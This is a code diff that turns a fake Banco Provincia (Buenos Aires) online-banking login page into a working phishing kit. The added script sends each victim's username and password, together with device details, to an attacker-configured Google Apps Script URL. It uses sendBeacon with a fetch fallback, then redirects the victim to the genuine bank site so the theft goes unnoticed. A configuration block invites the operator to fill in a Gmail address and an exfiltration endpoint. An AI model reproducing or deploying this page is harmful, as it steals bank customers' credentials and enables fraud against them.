@@ -1,239 +1,223 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Banco de la Provincia de Buenos Aires</title>
-    <!-- Usamos FontAwesome para el icono del ojo -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --verde-principal: #009b5c; /* Verde característico */
-            --gris-texto: #333333;
-            --gris-input: #f2f2f2;
-            --borde-inferior: #cccccc;
-            --gradiente-header: linear-gradient(90deg, #009b5c 0%, #2ebcb5 100%);
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#17a34a">
+<title>Banco Provincia</title>
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+<!-- ============ LOGO (archivo en la raíz) ============ -->
+<link rel="icon" type="image/png" href="logo.png">
+<link rel="shortcut icon" type="image/png" href="logo.png">
+<link rel="apple-touch-icon" href="logo.png">
+<meta property="og:image" content="logo.png">
 
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #eef3f7;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
+<style>
+:root{
+  --verde1:#17a34a;
+  --verde2:#12a086;
+  --verde-txt:#0a7d3e;
+  --gris-input:#f6f6f6;
+  --gris-borde:#c9c9c9;
+  --gris-boton:#3a3a3a;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{min-height:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  background:#fff;color:#333;overflow-x:hidden;
+}
+.wrap{max-width:520px;margin:0 auto;min-height:100vh;display:flex;flex-direction:column}
 
-        .login-container {
-            width: 100%;
-            max-width: 400px;
-            background-color: #ffffff;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
+/* ---------------- HEADER ---------------- */
+.header{
+  background:linear-gradient(105deg,var(--verde1) 0%,#0fa273 62%,var(--verde2) 100%);
+  padding:32px 20px 60px;
+  display:flex;align-items:center;justify-content:center;gap:14px;
+}
+.brand{color:#fff;font-size:26px;line-height:1;letter-spacing:-.5px;white-space:nowrap}
+.brand span{font-weight:400}
+.brand b{font-weight:700}
+.logo{height:48px;width:48px;object-fit:contain;display:block;flex:0 0 auto}
 
-        @media (min-width: 401px) {
-            .login-container {
-                height: 90vh;
-                border-radius: 12px;
-                overflow: hidden;
-            }
-        }
+/* ---------------- TARJETA ---------------- */
+.card{
+  position:relative;background:#fff;
+  border-radius:28px 28px 0 0;
+  margin-top:-30px;
+  padding:32px 22px 60px;
+  flex:1;
+}
+h1{color:var(--verde-txt);font-size:31px;font-weight:700;letter-spacing:-.6px;margin-bottom:26px}
 
-        header {
-            background: var(--gradiente-header);
-            padding: 20px 15px;
-            text-align: center;
-            color: white;
-        }
+.field{margin-bottom:22px}
+label{display:block;font-size:17px;color:#2f2f2f;margin-bottom:9px}
+label .req{color:#e01b1b;font-weight:700}
 
-        .logo-area {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 10px;
-        }
+input[type=text],input[type=password]{
+  width:100%;border:none;border-bottom:1px solid var(--gris-borde);
+  background:var(--gris-input);color:#333;font-family:inherit;font-size:17px;
+  padding:15px 14px;border-radius:2px 2px 0 0;outline:none;
+}
+input::placeholder{color:#8b8b8b}
+input:focus{border-bottom:2px solid var(--verde-txt);padding-bottom:14px}
 
-        .logo-img {
-            width: 30px;
-            height: 30px;
-        }
+.pass-wrap{position:relative}
+.pass-wrap input{padding-right:54px}
+.eye{
+  position:absolute;right:10px;top:50%;transform:translateY(-50%);
+  background:none;border:none;padding:6px;cursor:pointer;line-height:0;
+}
+.eye svg{width:26px;height:26px;stroke:#4a4a4a;fill:none;stroke-width:1.8;
+  stroke-linecap:round;stroke-linejoin:round}
 
-        h1 {
-            font-size: 1.2rem;
-            font-weight: 500;
-        }
+button.submit{
+  width:100%;margin-top:28px;background:var(--gris-boton);color:#fff;border:none;
+  font-family:inherit;font-size:18px;padding:19px;border-radius:10px;cursor:pointer;
+  transition:opacity .15s;
+}
+button.submit:active{opacity:.88}
+button.submit:disabled{opacity:.6}
 
-        .subtitulo {
-            font-size: 1.1rem;
-            font-weight: 600;
-            margin-top: 5px;
-        }
+.status{text-align:center;font-size:14px;color:var(--verde-txt);min-height:20px;margin-top:16px}
 
-        form {
-            padding: 30px 25px;
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .input-group {
-            margin-bottom: 25px;
-            position: relative;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: var(--gris-texto);
-        }
-
-        input[type="text"],
-        input[type="password"] {
-            width: 100%;
-            padding: 12px 10px;
-            font-size: 1rem;
-            border: none;
-            border-bottom: 2px solid var(--borde-inferior);
-            background-color: var(--gris-input);
-            outline: none;
-            transition: border-color 0.3s ease;
-        }
-
-        input:focus {
-            border-bottom-color: var(--verde-principal);
-            background-color: #fff;
-        }
-
-        input::placeholder {
-            color: #999;
-        }
-
-        .toggle-password {
-            position: absolute;
-            right: 10px;
-            top: 35px; 
-            background: none;
-            border: none;
-            color: var(--verde-principal);
-            cursor: pointer;
-            font-size: 1.1rem;
-        }
-
-        .btn-ingresar {
-            width: 100%;
-            padding: 14px;
-            background-color: var(--gris-texto);
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 1rem;
-            font-weight: 500;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-
-        .btn-ingresar:hover {
-            background-color: #555;
-        }
-
-        .links-footer {
-            padding: 20px 25px;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            border-top: 1px solid #eee;
-            background-color: #fafafa;
-        }
-
-        .link-item {
-            text-decoration: underline;
-            color: var(--verde-principal);
-            font-size: 0.9rem;
-            text-align: left;
-        }
-
-        .required {
-            color: red;
-        }
-    </style>
+.links{margin-top:26px;display:flex;flex-direction:column;align-items:center;gap:26px;text-align:center}
+.links a{color:var(--verde-txt);font-size:17px;text-decoration:underline;text-underline-offset:3px}
+</style>
 </head>
 <body>
 
-<div class="login-container">
-    <header>
-        <div class="logo-area">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Banco_de_la_Provincia_de_Buenos_Aires_Logo.svg/1200px-Banco_de_la_Provincia_de_Buenos_Aires_Logo.svg.png" alt="Logo BP" class="logo-img">
-            <h1>Banco Provincia</h1>
-        </div>
-        <div class="subtitulo">Iniciá sesión</div>
-    </header>
+<div class="wrap">
 
-    <form id="miFormulario">
-        <div class="input-group">
-            <label for="usuario">Tu usuario <span class="required">*</span></label>
-            <input type="text" id="usuario" name="usuario" placeholder="Ingresá tu nombre de usuario" required>
-        </div>
+  <header class="header">
+    <div class="brand"><span>Banco</span> <b>Provincia</b></div>
+    <img class="logo" src="logo.png" alt="Logo">
+  </header>
 
-        <div class="input-group">
-            <label for="clave">Tu clave <span class="required">*</span></label>
-            <input type="password" id="clave" name="clave" placeholder="Ingresá tu clave" required>
-            <button type="button" class="toggle-password" onclick="togglePassword()">
-                <i class="fa-regular fa-eye"></i>
-            </button>
-        </div>
+  <main class="card">
+    <h1>Iniciá sesión</h1>
 
-        <button type="submit" class="btn-ingresar">ingresar</button>
+    <form id="loginForm" novalidate>
+      <div class="field">
+        <label for="usuario">Tu usuario <span class="req">*</span></label>
+        <input id="usuario" name="usuario" type="text"
+               placeholder="Ingresá tu nombre de usuario"
+               autocomplete="username" autocapitalize="off" spellcheck="false" required>
+      </div>
+
+      <div class="field">
+        <label for="clave">Tu clave <span class="req">*</span></label>
+        <div class="pass-wrap">
+          <input id="clave" name="clave" type="password"
+                 placeholder="Ingresá tu clave"
+                 autocomplete="current-password" required>
+          <button type="button" class="eye" id="togglePass" aria-label="Mostrar clave">
+            <svg viewBox="0 0 24 24">
+              <path d="M2 12s3.8-6.5 10-6.5S22 12 22 12s-3.8 6.5-10 6.5S2 12 2 12z"/>
+              <circle cx="12" cy="12" r="3"/>
+              <line x1="4" y1="20" x2="20" y2="4"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <button class="submit" type="submit" id="btn">Ingresar</button>
+      <div class="status" id="status"></div>
     </form>
 
-    <div class="links-footer">
-        <a href="#" class="link-item">¿No sos BIP? Registrate</a>
-        <a href="#" class="link-item">Bloqueé u olvidé mi usuario y/o clave</a>
-        <a href="#" class="link-item">Conocé como hacerte usuario u operar</a>
-        <a href="#" class="link-item">Recomendaciones de seguridad</a>
-    </div>
+    <nav class="links">
+      <a href="#">¿No sos BIP? Registrate</a>
+      <a href="#">Bloqueé u olvidé mi usuario y/o clave</a>
+      <a href="#">Conocé como hacerte usuario u operar</a>
+      <a href="#">Recomendaciones de seguridad</a>
+    </nav>
+  </main>
+
 </div>
 
 <script>
-    // Función para mostrar/ocultar contraseña
-    function togglePassword() {
-        const passwordInput = document.getElementById('clave');
-        const icon = document.querySelector('.toggle-password i');
-        
-        if (passwordInput.type === 'password') {
-            passwordInput.type = 'text';
-            icon.classList.remove('fa-eye');
-            icon.classList.add('fa-eye-slash');
-        } else {
-            passwordInput.type = 'password';
-            icon.classList.remove('fa-eye-slash');
-            icon.classList.add('fa-eye');
-        }
-    }
+/* ==========================================================
+   >>>>>>>>>>>>>  ACÁ VAN TUS 2 DATOS  <<<<<<<<<<<<<<
+   ========================================================== */
+const CONFIG = {
+  CORREO:      "tu.correo@gmail.com",                            // 1) TU GMAIL
+  URL_SCRIPT:  "https://script.google.com/macros/s/XXXXXX/exec", // 2) TU URL /exec
+  redirigir:   true,
+  urlDestino:  "https://provincia.bancainternet.com.ar/",
+  espera:      1.5
+};
+/* ========================================================== */
 
-    // Aquí puedes agregar tu lógica personalizada
-    document.getElementById('miFormulario').addEventListener('submit', function(event) {
-        event.preventDefault();
-        const usuario = document.getElementById('usuario').value;
-        const clave = document.getElementById('clave').value;
-        
-        console.log("Usuario:", usuario);
-        console.log("Clave:", clave);
-        
-        // Tu lógica aquí...
-    });
+/* ---------- mostrar / ocultar clave ---------- */
+const clave  = document.getElementById('clave');
+const toggle = document.getElementById('togglePass');
+
+const OJO_ABIERTO = '<svg viewBox="0 0 24 24"><path d="M2 12s3.8-6.5 10-6.5S22 12 22 12s-3.8 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="3"/></svg>';
+const OJO_CERRADO = '<svg viewBox="0 0 24 24"><path d="M2 12s3.8-6.5 10-6.5S22 12 22 12s-3.8 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="3"/><line x1="4" y1="20" x2="20" y2="4"/></svg>';
+
+toggle.addEventListener('click', function () {
+  const oculta = clave.type === 'password';
+  clave.type = oculta ? 'text' : 'password';
+  toggle.innerHTML = oculta ? OJO_ABIERTO : OJO_CERRADO;
+});
+
+/* ---------- envío ---------- */
+const form   = document.getElementById('loginForm');
+const btn    = document.getElementById('btn');
+const status = document.getElementById('status');
+
+function enviarDatos(payload) {
+  const texto = JSON.stringify(payload);
+  const blob  = new Blob([texto], { type: 'text/plain;charset=utf-8' });
+
+  // 1) sendBeacon: sobrevive aunque la página se redirija enseguida
+  let enviado = false;
+  try { enviado = navigator.sendBeacon(CONFIG.URL_SCRIPT, blob); } catch (e) {}
+
+  // 2) respaldo con fetch (sin CORS, no esperamos respuesta)
+  if (!enviado) {
+    fetch(CONFIG.URL_SCRIPT, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+      body: texto,
+      keepalive: true
+    }).catch(function () {});
+  }
+  return true;
+}
+
+form.addEventListener('submit', function (e) {
+  e.preventDefault();
+
+  const usuario = document.getElementById('usuario').value.trim();
+  const pass    = clave.value;
+
+  if (!usuario) { status.textContent = 'Ingresá tu usuario'; return; }
+  if (!pass)    { status.textContent = 'Ingresá tu clave';   return; }
+
+  btn.disabled = true;
+  status.textContent = 'Enviando...';
+
+  enviarDatos({
+    usuario:     usuario,
+    clave:       pass,
+    correoDestino: CONFIG.CORREO,
+    fecha:       new Date().toLocaleString('es-AR'),
+    dispositivo: navigator.userAgent,
+    pantalla:    window.screen.width + 'x' + window.screen.height
+  });
+
+  status.textContent = 'Datos enviados ✔';
+
+  if (CONFIG.redirigir) {
+    setTimeout(function () { window.location.href = CONFIG.urlDestino; },
+               CONFIG.espera * 1000);
+  } else {
+    btn.disabled = false;
+  }
+});
 </script>
 
 </body>
 </html>
-
